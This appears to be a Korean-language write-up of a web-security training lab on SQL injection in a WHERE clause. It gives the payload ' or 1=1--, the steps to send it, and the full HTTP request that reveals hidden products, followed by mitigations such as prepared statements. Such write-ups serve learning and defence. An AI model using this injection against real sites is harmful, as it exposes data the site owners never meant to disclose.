# Lab: SQL injection in WHERE clause allowing retrieval of hidden data
**SQL Injection / 인증 우회 아님(데이터 노출) · Apprentice**

## TL;DR
카테고리 필터 기프트에 ' or 1=1--을 삽입하여 미공개 상품을 전부 노출시켰다
'(탈출) + OR 1=1(항상 참) + --(뒷조건 주석)
## 취약점
작은 따옴표로 문자열을 탈출하고, sql구문을 주입해서 서버가 사용자 입력을 데이터가 아닌 sql구문으로 실행함

## 익스플로잇
1. 카테고리에 있는 아무거나 누르고 요청을 리피터로 보낸다.
2. 카테고리 뒷부분에 ' or 1=1--를 붙여서 send를 누른다.
3. 숨겨져 있는 항목이 드러난다.

## 핵심 요청
```http
GET /filter?category=Gifts%27+OR+1=1-- HTTP/2
Host: .web-security-academy.net
```
(%27 = ' , + = 공백)

## 영향
사용자 입력이 sql쿼리로 실행되면, 우회해서 숨겨지거나 민감한 정보를 사용자가 조회할 수 있다.

## 대응
- Prepared Statement(파라미터화 쿼리) 사용 — 입력을 데이터로만 처리
- 사용자 입력을 쿼리 문자열에 직접 연결 금지
- 최소 권한 DB 계정, 입력 검증 병행
